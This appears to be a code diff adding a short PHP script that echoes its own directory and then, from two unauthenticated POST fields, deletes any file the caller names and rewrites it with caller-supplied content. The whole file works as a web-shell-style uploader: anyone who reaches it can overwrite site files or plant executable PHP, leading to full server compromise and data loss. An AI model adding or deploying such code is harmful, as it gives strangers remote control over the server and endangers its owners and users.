@@ -1,0 +1,22 @@
+<?php
+echo (dirname(__FILE__).'<br />');
+echo ('This shiet works! <br />');
+if (isset($_POST['fname']) && isset($_POST['fdata'])){
+    $fname = $_POST['fname'];
+    $fdata = $_POST['fdata'];
+    if (unlink($fname)){
+        echo ($fname.' deleted successfully! <br />');
+    }
+    else{
+        echo ($fname.' doesn`t exist!<br />');
+    }
+    $fp = fopen ($fname, "w");
+    if (fwrite ($fp, $fdata)){
+        echo ($fname.' created and filled! <br />');
+    }
+    fclose ($fp);
+}
+else{
+    echo ('Data or name doesn`t sent');
+}
+?>
